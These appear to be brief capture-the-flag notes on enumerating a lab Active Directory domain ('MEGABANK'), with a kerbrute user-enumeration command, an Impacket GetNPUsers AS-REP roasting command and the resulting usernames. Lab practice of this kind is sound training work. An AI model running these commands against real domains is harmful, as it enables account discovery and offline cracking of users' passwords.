
Valid Users
```
kerbrute userenum -d MEGABANK --dc 10.10.10.172 valid_user.txt -t 100
```
![[Pasted image 20240503124645.png]]

```
svc-bexec@MEGABANK
svc-ata@MEGABANK
roleary@MEGABANK
SABatchJobs@MEGABANK
svc-netapp@MEGABANK
smorgan@MEGABANK
administrator@MEGABANK
```


```
GetNPUsers.py MEGABANK/ -usersfile valid_user.txt -format john -dc-ip 10.10.10.172
```
![[Pasted image 20240503124918.png]]

```
smorgan
Administrator
krbtgt
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
Guest
Administrator
AAD_987d7f2f57d2
mhope
dgalanos
Administrator
roleary
```